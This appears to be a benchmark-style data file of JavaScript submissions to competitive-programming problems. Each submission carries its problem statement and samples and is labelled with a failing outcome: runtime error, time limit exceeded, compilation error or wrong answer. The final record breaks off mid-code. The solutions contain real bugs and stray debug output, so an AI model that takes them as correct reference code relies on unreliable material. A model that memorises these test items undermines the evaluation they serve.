{"difficulty":900,"lang":"Node.js","lang_cluster":"javascript","src_uid":"63_A","submission_id":"121026710","tags":["implementation","sortings","strings"],"exec_outcome":"RUNTIME_ERROR","source_code":"const prompt = require('prompt-sync')();\r\n\r\nfunction sort(members) {\r\n    var rats = []\r\n    var womanChildren = []\r\n    var men = []\r\n    var captain = []\r\n    for (const member of members) {\r\n        if (member.status == \"rat\")\r\n            rats.push(member.name)\r\n        if (member.status == \"woman\" || member.status == \"child\")\r\n            womanChildren.push(member.name)\r\n        if (member.status == \"man\")\r\n            men.push(member.name)\r\n        if (member.status == \"captain\")\r\n            captain.push(member.name)\r\n    }\r\n    const out = [...rats, ...womanChildren, ...men, ...captain]\r\n    return out\r\n}\r\n\r\nfunction sinking_ship() {\r\n    var members = []\r\n    var number = parseInt(prompt())\r\n    for (let i = 0; i < number; i++) {\r\n        const line = prompt()\r\n        const words = line.split(\" \")\r\n        members.push({\r\n            name: words[0],\r\n            status: words[1]\r\n        })\r\n    }\r\n    const result = sort(members)\r\n    for (const res of result) {\r\n        console.log(res);\r\n    }\r\n}\r\n\r\n\r\nconst final = sinking_ship()","description":"The ship crashed into a reef and is sinking. Now the entire crew must be evacuated. All n crew members have already lined up in a row (for convenience let's label them all from left to right with positive integers from 1 to n) and await further instructions. However, one should evacuate the crew properly, in a strict order. Specifically:The first crew members to leave the ship are rats. Then women and children (both groups have the same priority) leave the ship. After that all men are evacuated from the ship. The captain leaves the sinking ship last.If we cannot determine exactly who should leave the ship first for any two members of the crew by the rules from the previous paragraph, then the one who stands to the left in the line leaves the ship first (or in other words, the one whose number in the line is less).For each crew member we know his status as a crew member, and also his name. All crew members have different names. Determine the order in which to evacuate the crew.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer n, which is the number of people in the crew (1\u2264n\u2264100). Then follow n lines. The i-th of those lines contains two words \u2014 the name of the crew member who is i-th in line, and his status on the ship. The words are separated by exactly one space. There are no other spaces in the line. The names consist of Latin letters, the first letter is uppercase, the rest are lowercase. The length of any name is from 1 to 10 characters. The status can have the following values: rat for a rat, woman for a woman, child for a child, man for a man, captain for the captain. The crew contains exactly one captain.\n","output_spec":"Print n lines. The i-th of them should contain the name of the crew member who must be the i-th one to leave the ship.\n","notes":null,"sample_inputs":["6\nJack captain\nAlice woman\nCharlie man\nTeddy rat\nBob child\nJulia woman\n"],"sample_outputs":["Teddy\nAlice\nBob\nJulia\nCharlie\nJack\n"]}
{"difficulty":1200,"lang":"Node.js","lang_cluster":"javascript","src_uid":"63_B","submission_id":"107369431","tags":["implementation"],"exec_outcome":"TIME_LIMIT_EXCEEDED","source_code":"const readline = require('readline').createInterface({\r\n  input: process.stdin,\r\n  output: process.stdout\r\n});\r\nlet isFirstLine = false;\r\nlet number;\r\nlet maxRank;\r\nlet soldiers;\r\nlet coin = 0;\r\nreadline.on('line', line => {\r\n  if (isFirstLine) {\r\n    let firstLine = line.split(' ');\r\n    number = firstLine[0];\r\n    maxRank = firstLine[1]\r\n    isFirstLine = false;\r\n  } else {\r\n    soldiers = line.split(' ');\r\n    readline.close();\r\n    while(true) {\r\n    if(soldiers.every(function(soldier){\r\n        return soldier == maxRank;\r\n    })){\r\n        break;\r\n    }\r\n    soldiers = soldiers.map(function(soldier, index, self){\r\n        if(index === self.indexOf(soldier) && soldier < maxRank){\r\n            soldier++;\r\n        }\r\n        return soldier;\r\n    });\r\n    coin++;\r\n    }\r\n    console.log(coin);\r\n  }\r\n}) ","description":"In a strategic computer game \"Settlers II\" one has to build defense structures to expand and protect the territory. Let's take one of these buildings. At the moment the defense structure accommodates exactly n soldiers. Within this task we can assume that the number of soldiers in the defense structure won't either increase or decrease.Every soldier has a rank \u2014 some natural number from 1 to k. 1 stands for a private and k stands for a general. The higher the rank of the soldier is, the better he fights. Therefore, the player profits from having the soldiers of the highest possible rank.To increase the ranks of soldiers they need to train. But the soldiers won't train for free, and each training session requires one golden coin. On each training session all the n soldiers are present.At the end of each training session the soldiers' ranks increase as follows. First all the soldiers are divided into groups with the same rank, so that the least possible number of groups is formed. Then, within each of the groups where the soldiers below the rank k are present, exactly one soldier increases his rank by one.You know the ranks of all n soldiers at the moment. Determine the number of golden coins that are needed to increase the ranks of all the soldiers to the rank k.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and k (1\u2264n,k\u2264100). They represent the number of soldiers and the number of different ranks correspondingly. The second line contains n numbers in the non-decreasing order. The i-th of them, ai, represents the rank of the i-th soldier in the defense building (1\u2264i\u2264n, 1\u2264ai\u2264k).\n","output_spec":"Print a single integer \u2014 the number of golden coins needed to raise all the soldiers to the maximal rank.\n","notes":"In the first example the ranks will be raised in the following manner:\n1 2 2 3 \u2192 2 2 3 4 \u2192 2 3 4 4 \u2192 3 4 4 4 \u2192 4 4 4 4\nThus totals to 4 training sessions that require 4 golden coins.\n","sample_inputs":["4 4\n1 2 2 3\n","4 3\n1 1 1 1\n"],"sample_outputs":["4","5"]}
{"difficulty":800,"lang":"Node.js","lang_cluster":"javascript","src_uid":"b69170c8377623beb66db4706a02ffc6","submission_id":"a3db5f57863c0fbc8860118085ae79d0","tags":["math"],"exec_outcome":"COMPILATION_ERROR","source_code":"var data = \"\";\n\nprocess.stdin.on(\"data\", x => data += x);\n\n\/\/ process.on(\"SIGINT\", () => {\nprocess.stdin.on(\"end\", () => {\n\n    var eol = data.indexOf(\"\\r\")+1 ? (data.indexOf(\"\\n\")+1 ? \"\\r\\n\" : \"\\r\") : \"\\n\";\n\n    var lines = data.split(eol);\n\n\tvar lines0 = +lines.shift();\n\n    var n = +lines0.split(\" \")[0];\n\n    if(lines[lines.length-1] == \"\") lines.pop();\n\n    for(let i = 0; i < n; i++) {\n\n        var arr = [];\n        var l = f.length;\n        for(let ii = 0; ii < l; ii++) arr.push(lines[l*i+ii]);\n        if(!l) {\n            arr = lines;\n            i = n;\n        }\n        f.apply({lines0}, arr);\n    }\n\n\tconsole.log(ans);\n\n    process.exit(0);\n});\n\nvar ans = \"\";\n\nfunction f(l) {\n\treturn l > 2 ? 0 : (l-1)\/2\n}\n","description":"There are two sisters Alice and Betty. You have $$$n$$$ candies. You want to distribute these $$$n$$$ candies between two sisters in such a way that:  Alice will get $$$a$$$ ($$$a &gt; 0$$$) candies;  Betty will get $$$b$$$ ($$$b &gt; 0$$$) candies;  each sister will get some integer number of candies;  Alice will get a greater amount of candies than Betty (i.e. $$$a &gt; b$$$);  all the candies will be given to one of two sisters (i.e. $$$a+b=n$$$). Your task is to calculate the number of ways to distribute exactly $$$n$$$ candies between sisters in a way described above. Candies are indistinguishable.Formally, find the number of ways to represent $$$n$$$ as the sum of $$$n=a+b$$$, where $$$a$$$ and $$$b$$$ are positive integers and $$$a&gt;b$$$.You have to answer $$$t$$$ independent test cases.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains one integer $$$t$$$ ($$$1 \\le t \\le 10^4$$$) \u2014 the number of test cases. Then $$$t$$$ test cases follow. The only line of a test case contains one integer $$$n$$$ ($$$1 \\le n \\le 2 \\cdot 10^9$$$) \u2014 the number of candies you have.","output_spec":"For each test case, print the answer \u2014 the number of ways to distribute exactly $$$n$$$ candies between two sisters in a way described in the problem statement. If there is no way to satisfy all the conditions, print $$$0$$$.","notes":"NoteFor the test case of the example, the $$$3$$$ possible ways to distribute candies are:  $$$a=6$$$, $$$b=1$$$;  $$$a=5$$$, $$$b=2$$$;  $$$a=4$$$, $$$b=3$$$. ","sample_inputs":["6\n7\n1\n2\n3\n2000000000\n763243547"],"sample_outputs":["3\n0\n0\n1\n999999999\n381621773"]}
{"difficulty":1200,"lang":"Node.js","lang_cluster":"javascript","src_uid":"cb4dbff31d967c3dab8fe0495eb871dc","submission_id":"re_469","tags":["dsu","dfs and similar","brute force","graphs"],"exec_outcome":"RUNTIME_ERROR","source_code":"process.stdin.resume();\nprocess.stdin.setEncoding('utf-8');\n\nlet inputString = '';\nlet currentLine = 0;\n\nprocess.stdin.on('data', inputStdin => {\n    inputString += inputStdin;\n});\n\nprocess.stdin.on('end', _ => {\n    inputString = inputString.trim().split('\\n').map(string => {\n        return string.trim();\n    });\n    \n    main();\n});\n\nfunction readline() {\n    return inputString[currentLine++];\n}\n\nfunction pi(a) {\n    return parseInt(a);\n}\n\nfunction ti(a){\n    for(let i = 0; i < a.length; i++)\n        a[i] = pi(a[i]);\n\n    return a;\n}\n\nfunction dsu(n){\n    this.parent = new Array(n);\n    for(let i = 0; i < n; i++)\n        this.parent[i] = i;\n\n    this.find = (x) => {\n        if(this.parent[x] === x)\n            return this.parent[x];\n\n        return this.find(this.parent[x]);\n    }\n\n    this.union = (x,y) => {\n        this.parent[this.find(x)] = this.find(y);\n    }\n}\n\nfunction main(){\n    let n = pi(readline());\n    let mapX = new Array(1005);\n    let mapY = new Array(1005);\n    mapX.fill(-1);\n    mapY.fill(-1);\n    let uf = new dsu(n);\n\n    for(let i = 0; i < n; i++){\n        let [x,y] = ti(readline().split(' '));\n        if(mapX[x] !== -1){\n            uf.union(mapX[x], i);\n        }else{\n            mapX[x] = i;\n        }\n\n        if(mapY[y] !== -1){\n            uf.union(mapY[y], i);\n        }else{\n            mapY[y] = i;\n        }\n    }\n\n    let res = 0;\n    for(let i = 0; i < n; i++)\n        if(uf.parent[i] === i)\n            res += 1;\n            \n    console.log(Math.floor(res \/ 2));\n}","description":"Bajtek is learning to skate on ice. He's a beginner, so his only mode of transportation is pushing off from a snow drift to the north, east, south or west and sliding until he lands in another snow drift. He has noticed that in this way it's impossible to get from some snow drifts to some other by any sequence of moves. He now wants to heap up some additional snow drifts, so that he can get from any snow drift to any other one. He asked you to find the minimal number of snow drifts that need to be created.We assume that Bajtek can only heap up snow drifts at integer coordinates.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of input contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 the number of snow drifts. Each of the following n lines contains two integers xi and yi (1\u2009\u2264\u2009xi,\u2009yi\u2009\u2264\u20091000) \u2014 the coordinates of the i-th snow drift. Note that the north direction coin\u0441ides with the direction of Oy axis, so the east direction coin\u0441ides with the direction of the Ox axis. All snow drift's locations are distinct.","output_spec":"Output the minimal number of snow drifts that need to be created in order for Bajtek to be able to reach any snow drift from any other one.","notes":null,"sample_inputs":["2\n2 1\n1 2","2\n2 1\n4 1"],"sample_outputs":["1","0"]}
{"difficulty":1900,"lang":"Node.js","lang_cluster":"javascript","src_uid":"1228_D","submission_id":"61506557","tags":["brute+force","constructive+algorithms","graphs","hashing","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"process.stdin.resume()\nprocess.stdin.setEncoding('utf-8')\n\nvar arr = ''\nprocess.stdin.on('data', (i) => {\n  arr += i\n})\n\n\nprocess.stdin.on('end', () => {\n  arr = arr.split('\\n')\n  const hw = arr.shift().split(' ')\n  const n = parseInt(hw[0])\n  const m = parseInt(hw[1])\n\n  const graph = new Map()\n  for(let i = 1; i <= n; i++) {\n    graph.set(i, 0)\n  }\n\n  for(let i = 0; i < m; i++) {\n    const edge = arr.shift().split(' ')\n    graph.set(parseInt(edge[0]), graph.get(parseInt(edge[0])) + 1)\n    graph.set(parseInt(edge[1]), graph.get(parseInt(edge[1])) + 1)\n  }\n\n  const deg = new Map()\n  graph.forEach((v, k) => {\n    if(!deg.get(v)) deg.set(v, 1)\n    else  deg.set(v, deg.get(v) + 1)\n  })\n\n  \/\/ console.log(graph)\n  \/\/ console.log(deg)\n  if(deg.size <= 3){\n    var iterator1 = deg.keys()\n    const ak = iterator1.next().value\n    const bk = iterator1.next().value\n    const ck = iterator1.next().value\n    const a = deg.get(ak)\n    const b = deg.get(bk)\n    const c = deg.get(ck)\n    \/\/ console.log(a,b,c, ak, bk)\n    if(a == (b + c)\n      || b == (a + c)\n      || c == (a + b)\n      || (a % 3 == 0 && b == undefined && c == undefined)\n      || (a == b && c == undefined)){\n      \/\/ console.log(graph)\n      graph.forEach((v, k) => {\n        \/\/ console.log(v)\n        if(v == ak){\n          process.stdout.write('1 ')\n        }\n        else if(v == bk){\n          process.stdout.write('2 ')\n        }\n        else{\n          process.stdout.write('3 ')\n        }\n      })\n      console.log()\n    }\n    else{\n      console.log(-1)\n    }\n  }\n  else{\n    console.log(-1)\n  }\n})","description":"You have a simple undirected graph consisting of $$$n$$$ vertices and $$$m$$$ edges. The graph doesn't contain self-loops, there is at most one edge between a pair of vertices. The given graph can be disconnected.Let's make a definition.Let $$$v_1$$$ and $$$v_2$$$ be two some nonempty subsets of vertices that do not intersect. Let $$$f(v_{1}, v_{2})$$$ be true if and only if all the conditions are satisfied:  There are no edges with both endpoints in vertex set $$$v_1$$$.  There are no edges with both endpoints in vertex set $$$v_2$$$.  For every two vertices $$$x$$$ and $$$y$$$ such that $$$x$$$ is in $$$v_1$$$ and $$$y$$$ is in $$$v_2$$$, there is an edge between $$$x$$$ and $$$y$$$. Create three vertex sets ($$$v_{1}$$$, $$$v_{2}$$$, $$$v_{3}$$$) which satisfy the conditions below;  All vertex sets should not be empty.  Each vertex should be assigned to only one vertex set.  $$$f(v_{1}, v_{2})$$$, $$$f(v_{2}, v_{3})$$$, $$$f(v_{3}, v_{1})$$$ are all true. Is it possible to create such three vertex sets? If it's possible, print matching vertex set for each vertex.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers $$$n$$$ and $$$m$$$ ($$$3 \\le n \\le 10^{5}$$$, $$$0 \\le m \\le \\text{min}(3 \\cdot 10^{5}, \\frac{n(n-1)}{2})$$$)\u00a0\u2014 the number of vertices and edges in the graph.\nThe $$$i$$$-th of the next $$$m$$$ lines contains two integers $$$a_{i}$$$ and $$$b_{i}$$$ ($$$1 \\le a_{i} \\lt b_{i} \\le n$$$)\u00a0\u2014 it means there is an edge between $$$a_{i}$$$ and $$$b_{i}$$$. The graph doesn't contain self-loops, there is at most one edge between a pair of vertices. The given graph can be disconnected.\n","output_spec":"If the answer exists, print $$$n$$$ integers. $$$i$$$-th integer means the vertex set number (from $$$1$$$ to $$$3$$$) of $$$i$$$-th vertex. Otherwise, print $$$-1$$$.\nIf there are multiple answers, print any.\n","notes":null,"sample_inputs":[],"sample_outputs":[]}
{"difficulty":1600,"lang":"Node.js","lang_cluster":"javascript","src_uid":"156_B","submission_id":"160013207","tags":["constructive+algorithms","data+structures","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"'use strict';\r\n\r\nfunction solve(n, m, s) {\r\n  console.log(n, m, s);\r\n  const segTree = new SegTree(new Array(n).fill(0));\r\n  for (let str of s) {\r\n    const num = Number(str.slice(1)) - 1;\r\n    if (str[0] === '+') {\r\n      segTree.update(num, num, 1);\r\n    } else {\r\n      segTree.update(0, num - 1, 1);\r\n      segTree.update(num + 1, n - 1, 1);\r\n    }\r\n  }\r\n  const suspects = new Set();\r\n  for (let i = 0; i < n; i++) {\r\n    const count = segTree.query(i, i);\r\n    if (count === m) suspects.add(i);\r\n  }\r\n  const res = new Array(n);\r\n  for (let i = 0; i < n; i++) {\r\n    const str = s[i];\r\n    const num = Number(str.slice(1)) - 1;\r\n    if (str[0] === '+') {\r\n      if (suspects.has(num)) {\r\n        if (suspects.size === 1) res[i] = 'Truth';else res[i] = 'Not defined';\r\n      } else {\r\n        res[i] = 'Lie';\r\n      }\r\n    } else {\r\n      if (suspects.has(num)) {\r\n        if (suspects.size === 1) res[i] = 'Lie';else res[i] = 'Not defined';\r\n      } else {\r\n        res[i] = 'Truth';\r\n      }\r\n    }\r\n  }\r\n  return res.join('\\n');\r\n}\r\nclass SegTree {\r\n  constructor(nums = [], n = nums.length - 1) {\r\n    this.nums = nums;\r\n    this.n = n;\r\n    this.root = this._newNode();\r\n    this._build(this.root, 0, n);\r\n    this.update = (x, y, z) => {\r\n      if (x > y) return;\r\n      x = Math.max(x, 0);\r\n      y = Math.min(y, n);\r\n      return this._update(this.root, 0, n, x, y, z);\r\n    };\r\n    this.query = (x, y) => {\r\n      if (x > y) return 0;\r\n      x = Math.max(x, 0);\r\n      y = Math.min(y, n);\r\n      return this._query(this.root, 0, n, x, y);\r\n    };\r\n  }\r\n  _newNode(val = 0, left = null, right = null) {\r\n    return {\r\n      val,\r\n      left,\r\n      right,\r\n      add: 0\r\n    };\r\n  }\r\n  _down(node, l, r) {\r\n    const {\r\n      left,\r\n      right\r\n    } = node;\r\n    if (!left || !right) return;\r\n    const mid = Math.floor((l + r) \/ 2);\r\n    left.add += node.add;\r\n    left.val += node.add * (mid - l + 1);\r\n    right.add += node.add;\r\n    right.val += node.add * (r - mid);\r\n    node.add = 0;\r\n  }\r\n  _up(node) {\r\n    const {\r\n      left,\r\n      right\r\n    } = node;\r\n    if (!left || !right) return;\r\n    node.val = left.val + right.val;\r\n  }\r\n  _build(node = this.root, l, r) {\r\n    if (l === r) {\r\n      var _this$nums$l;\r\n      node.val = (_this$nums$l = this.nums[l]) !== null && _this$nums$l !== void 0 ? _this$nums$l : 0;\r\n      return;\r\n    }\r\n    const mid = Math.floor((l + r) \/ 2);\r\n    node.left = this._newNode();\r\n    node.right = this._newNode();\r\n    this._build(node.left, l, mid);\r\n    this._build(node.right, mid + 1, r);\r\n    node.val = node.left.val + node.right.val;\r\n  }\r\n  _update(node, l, r, x, y, z) {\r\n    if (!node) return;\r\n    if (l === x && r === y) {\r\n      node.add += z;\r\n      node.val += z * (r - l + 1);\r\n      return;\r\n    }\r\n    this._down(node, l, r);\r\n    const mid = Math.floor((l + r) \/ 2);\r\n    if (y <= mid) this._update(node.left, l, mid, x, y, z);else if (x > mid) this._update(node.right, mid + 1, r, x, y, z);else this._update(node.left, l, mid, x, mid, z), this._update(node.right, mid + 1, r, mid + 1, y, z);\r\n    this._up(node);\r\n  }\r\n  _query(node, l, r, x, y) {\r\n    if (y < x) return 0;\r\n    if (!node) return 0;\r\n    if (l === x && r === y) return node.val;\r\n    this._down(node, l, r);\r\n    let res = 0,\r\n        mid = Math.floor((l + r) \/ 2);\r\n    if (y <= mid) res = this._query(node.left, l, mid, x, y);else if (x > mid) res = this._query(node.right, mid + 1, r, x, y);else res = this._query(node.left, l, mid, x, mid) + this._query(node.right, mid + 1, r, mid + 1, y);\r\n    this._up(node);\r\n    return res;\r\n  }\r\n}\r\n\r\nasync function main(read) {\r\n  try {\r\n    let res = [];\r\n    let t = 1;\r\n    while (t--) {\r\n      const [n, m] = (await read()).split(' ').map(Number);\r\n      const a = [];\r\n      let tmp = n;\r\n      while (tmp--) {\r\n        a.push(await read());\r\n      }\r\n      res.push(solve(n, m, a));\r\n    }\r\n    console.log(res.join('\\n'));\r\n  } catch (error) {\r\n    console.log(error);\r\n  }\r\n}\r\n\r\nlet inputs,\r\n    str = '';\r\nfunction read() {\r\n  return inputs.next().value.trim();\r\n}\r\nprocess.stdin.resume();\r\nprocess.stdin.setEncoding('utf8');\r\nprocess.stdin.on('data', input => str += input);\r\nprocess.stdin.on('end', () => {\r\n  inputs = str.split('\\n').values();\r\n  main(read);\r\n});\r\n","description":"As Sherlock Holmes was investigating a crime, he identified n suspects. He knows for sure that exactly one of them committed the crime. To find out which one did it, the detective lines up the suspects and numbered them from 1 to n. After that, he asked each one: \"Which one committed the crime?\". Suspect number i answered either \"The crime was committed by suspect number ai\", or \"Suspect number ai didn't commit the crime\". Also, the suspect could say so about himself (ai=i).Sherlock Holmes understood for sure that exactly m answers were the truth and all other answers were a lie. Now help him understand this: which suspect lied and which one told the truth?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m (1\u2264n\u226410^5,0\u2264m\u2264n) \u2014 the total number of suspects and the number of suspects who told the truth. Next n lines contain the suspects' answers. The i-th line contains either \"+ai\" (without the quotes), if the suspect number i says that the crime was committed by suspect number ai, or \"-ai\" (without the quotes), if the suspect number i says that the suspect number ai didn't commit the crime (ai is an integer, 1\u2264ai\u2264n).\nIt is guaranteed that at least one suspect exists, such that if he committed the crime, then exactly m people told the truth.\n","output_spec":"Print n lines. Line number i should contain \"Truth\" if suspect number i has told the truth for sure. Print \"Lie\" if the suspect number i lied for sure and print \"Not defined\" if he could lie and could tell the truth, too, depending on who committed the crime.\n","notes":"The first sample has the single person and he confesses to the crime, and Sherlock Holmes knows that one person is telling the truth. That means that this person is telling the truth.\nIn the second sample there are three suspects and each one denies his guilt. Sherlock Holmes knows that only two of them are telling the truth. Any one of them can be the criminal, so we don't know for any of them, whether this person is telling the truth or not.\nIn the third sample the second and the fourth suspect defend the first and the third one. But only one is telling the truth, thus, the first or the third one is the criminal. Both of them can be criminals, so the second and the fourth one can either be lying or telling the truth. The first and the third one are lying for sure as they are blaming the second and the fourth one.\n","sample_inputs":["1 1\n+1\n","3 2\n-1\n-2\n-3\n","4 1\n+2\n-3\n+4\n-1\n"],"sample_outputs":["Truth\n","Not defined\nNot defined\nNot defined\n","Lie\nNot defined\nLie\nNot defined\n"]}
{"difficulty":1600,"lang":"Node.js","lang_cluster":"javascript","src_uid":"175_C","submission_id":"166090584","tags":["greedy","implementation","sortings","two+pointers"],"exec_outcome":"WRONG_ANSWER","source_code":"var readline = require('readline')\r\nconst rl = readline.createInterface({\r\n  input: process.stdin,\r\n  output: process.stdout\r\n})\r\nvar inputs = []\r\n\r\nconst fn = debounce(function () {\r\n  var n = +inputs[0];\r\n  var monsters = inputs.slice(1, n + 1).map(function (str) {\r\n    return str.split(' ').map(function (x) {\r\n      return +x;\r\n    });\r\n  });\r\n  var t = +inputs[n + 1];\r\n  var p = inputs[n + 2].split(' ').map(function (x) {\r\n    return +x;\r\n  });\r\n  monsters.sort(function (a, b) {\r\n    return a[1] - b[1];\r\n  });\r\n  var i = 0,\r\n    j = 0,\r\n    sum = 0,\r\n    ans = 0,\r\n    pre = 0,\r\n    factor = 1;\r\n  for (; i < n; i++) {\r\n    var _a = monsters[i],\r\n      cnt = _a[0],\r\n      score = _a[1];\r\n    sum += cnt;\r\n    while (sum > p[j] && j < t) {\r\n      ans += (p[j] - pre) * score * factor;\r\n      \/\/ console.log(ans, p[j], pre, score, factor)\r\n      pre = p[j];\r\n      j++;\r\n      factor++;\r\n    }\r\n    if (sum <= p[j]) {\r\n      ans += (sum - pre) * score * factor;\r\n      \/\/ console.log(ans, p[j], pre, score, factor)\r\n      pre = sum;\r\n    }\r\n  }\r\n  write(ans + '');\r\n})\r\nrl.on('line', function (line) {\r\n  inputs.push(line.trim());\r\n  fn()\r\n})\r\n\r\nfunction debounce(cb, delay) {\r\n  if (delay === void 0) {\r\n    delay = 100;\r\n  }\r\n  var timer = -1;\r\n  return function () {\r\n    if (timer !== -1) {\r\n      clearTimeout(timer);\r\n    }\r\n    timer = setTimeout(function () {\r\n      cb();\r\n      timer = -1;\r\n    }, delay);\r\n  };\r\n}\r\n\r\nfunction write(x) {\r\n  console.log(x)\r\n}","description":"Vasya plays the Geometry Horse.The game goal is to destroy geometric figures of the game world. A certain number of points is given for destroying each figure depending on the figure type and the current factor value. There are n types of geometric figures. The number of figures of type ki and figure cost ci is known for each figure type. A player gets ci\u00b7f  points for destroying one figure of type i, where f is the current factor. The factor value can be an integer number from 1 to t+1, inclusive. At the beginning of the game the factor value is equal to 1. The factor is set to i+1 after destruction of pi (1\u2264i\u2264t) figures, so the (pi+1)-th figure to be destroyed is considered with factor equal to i+1.Your task is to determine the maximum number of points Vasya can get after he destroys all figures. Take into account that Vasya is so tough that he can destroy figures in any order chosen by him.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the only integer number n (1\u2264n\u2264100) \u2014 the number of figure types.\nEach of the following n lines contains two integer numbers ki and ci (1\u2264ki\u226410^9,0\u2264ci\u22641000), separated with space \u2014 the number of figures of the i-th type and the cost of one i-type figure, correspondingly.\nThe next line contains the only integer number t (1\u2264t\u2264100) \u2014 the number that describe the factor's changes. \nThe next line contains t integer numbers pi (1\u2264p1<p2<...<pt\u226410^12), separated with spaces.\nPlease, do not use the %lld specificator to read or write 64-bit integers in \u0421++. It is preferred to use cin, cout streams or the %I64d specificator.\n","output_spec":"Print the only number \u2014 the maximum number of points Vasya can get.\n","notes":"In the first example Vasya destroys three figures first and gets 3\u00b71\u00b710=30 points. Then the factor will become equal to 2 and after destroying the last two figures Vasya will get 2\u00b72\u00b710=40 points. As a result Vasya will get 70 points.\nIn the second example all 8 figures will be destroyed with factor 1, so Vasya will get (3\u00b78+5\u00b710)\u00b71=74 points.\n","sample_inputs":["1\n5 10\n2\n3 6\n","2\n3 8\n5 10\n1\n20\n"],"sample_outputs":["70","74"]}
{"difficulty":1700,"lang":"JavaScript","lang_cluster":"javascript","src_uid":"18_B","submission_id":"15929658","tags":["brute+force","math"],"exec_outcome":"RUNTIME_ERROR","source_code":"'use strict'\r\n\r\nlet lll = readline().split(' ').map(v => parseInt(v))\r\n\r\nconst N = lll[0]\r\nconst D = lll[1]\r\nconst M = lll[2]\r\nconst L = lll[3]\r\n\r\nconst MAX = (N - 1) * M + L\r\nconsole.log(MAX)\r\n\r\nlet cur = 0\r\nlet d = D\r\n\r\n;(function () {\r\n  while (true) {\r\n    cur += D\r\n    if (cur > MAX) return print(cur)\r\n\r\n    let pop = d % M\r\n    if (pop < L) {\r\n      let ss = Math.floor(L \/ D)\r\n      cur += D * ss\r\n      d += D * ss\r\n    }\r\n    if (pop > L) return print(cur)\r\n    d = D + pop\r\n  }\r\n})()","description":"In one one-dimensional world there are n platforms. Platform with index k (platforms are numbered from 1) is a segment with coordinates [(k-1)m,(k-1)m+l], and l<m. Grasshopper Bob starts to jump along the platforms from point 0, with each jump he moves exactly d units right. Find out the coordinate of the point, where Bob will fall down. The grasshopper falls down, if he finds himself not on the platform, but if he finds himself on the edge of the platform, he doesn't fall down.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains 4 integer numbers n, d, m, l (1\u2264n,d,m,l\u226410^6,l<m) \u2014 respectively: amount of platforms, length of the grasshopper Bob's jump, and numbers m and l needed to find coordinates of the k-th platform: [(k-1)m,(k-1)m+l].\n","output_spec":"Output the coordinates of the point, where the grosshopper will fall down. Don't forget that if Bob finds himself on the platform edge, he doesn't fall down.\n","notes":null,"sample_inputs":["2 2 5 3\n","5 4 11 8\n"],"sample_outputs":["4\n","20\n"]}
{"difficulty":1700,"lang":"JavaScript","lang_cluster":"javascript","src_uid":"53_B","submission_id":"gpt3_53_B_2","tags":["binary+search","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"function calculateCutArea(input) {\n  const [h, w] = input.split(' ').map(Number);\n  \n  \/\/ Initialize variables to store the best cut area\n  let bestHeight = 0;\n  let bestWidth = 0;\n  let bestArea = 0;\n  \n  \/\/ Iterate over possible height values\n  for (let height = h; height >= Math.ceil(h * 0.8); height--) {\n    \/\/ Calculate the corresponding width based on the height and the allowed ratio\n    const width = Math.floor(height \/ 0.8);\n    \n    \/\/ Check if the width is a power of 2\n    if ((width & (width - 1)) === 0) {\n      \/\/ Calculate the area of the current cut area\n      const area = height * width;\n      \n      \/\/ Update the best cut area if the current area is larger\n      if (area > bestArea) {\n        bestHeight = height;\n        bestWidth = width;\n        bestArea = area;\n      }\n    }\n  }\n  \n  return `${bestHeight} ${bestWidth}`;\n}\n\nconst inputs = ['2 1\\n', '2 2\\n', '5 5\\n'];\nconst outputs = inputs.map(calculateCutArea);\n\nJSON.stringify(outputs);","description":"One popular blog site edits the uploaded photos like this. It cuts a rectangular area out of them so that the ratio of height to width (i.e. the height\/width quotient) can vary from 0.8 to 1.25 inclusively. Besides, at least one side of the cut area should have a size, equal to some power of number 2 (2^x for some integer x). If those rules don't indicate the size of the cut are clearly, then the way with which the cut part possesses the largest area is chosen. Of course, both sides of the cut area should be integer. If there are several answers to this problem, you should choose the answer with the maximal height.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a pair of integers h and w (1\u2264h,w\u226410^9) which are the height and width of the uploaded photo in pixels.\n","output_spec":"Print two integers which are the height and width of the cut area.\n","notes":null,"sample_inputs":["2 1\n","2 2\n","5 5\n"],"sample_outputs":["1 1\n","2 2\n","5 4\n"]}
{"difficulty":2100,"lang":"JavaScript","lang_cluster":"javascript","src_uid":"5_D","submission_id":"10450152","tags":["implementation","math"],"exec_outcome":"RUNTIME_ERROR","source_code":"\/\/ Generated by CoffeeScript 1.4.0\n(function() {\n  var UniAccel, a, d, l, r, sa, sc, sd, sf, su, sv, sw, td, tf, tu, v, vb, w, _ref, _ref1;\n\n  UniAccel = {\n    vel_change_disp: function(v0, v1, a) {\n      return (v1 * v1 - v0 * v0) \/ (2 * a);\n    },\n    disp_time: function(s, v0, a) {\n      return (Math.sqrt(v0 * v0 + 2 * a * s) - v0) \/ a;\n    }\n  };\n\n  _ref = readline().split(' ').map(function(x) {\n    return parseInt(x);\n  }), a = _ref[0], v = _ref[1];\n\n  _ref1 = readline().split(' ').map(function(x) {\n    return parseInt(x);\n  }), l = _ref1[0], d = _ref1[1], w = _ref1[2];\n\n  sw = UniAccel.vel_change_disp(0, w, a);\n\n  sv = UniAccel.vel_change_disp(0, v, a);\n\n  if (w > v || sw >= d) {\n    if (sv > l) {\n      print(1);\n      print(UniAccel.disp_time(l, 0, a).toFixed(5));\n    } else {\n      print(2);\n      print((v \/ a + (l - sv) \/ v).toFixed(5));\n    }\n  } else {\n    sf = UniAccel.vel_change_disp(w, v, a);\n    tf = 0;\n    r = l - d;\n    if (sf > r) {\n      tf = UniAccel.disp_time(r, w, a);\n    } else {\n      tf = UniAccel.disp_time(sf, w, a) + (r - sf) \/ v;\n    }\n    su = UniAccel.vel_change_disp(0, v, a);\n    sd = UniAccel.vel_change_disp(v, w, -a);\n    sa = su + sd;\n    if (sa <= d) {\n      print(3);\n      sc = d - sa;\n      tu = UniAccel.disp_time(su, 0, a);\n      td = UniAccel.disp_time(sd, v, -a);\n      print((tu + sc \/ v 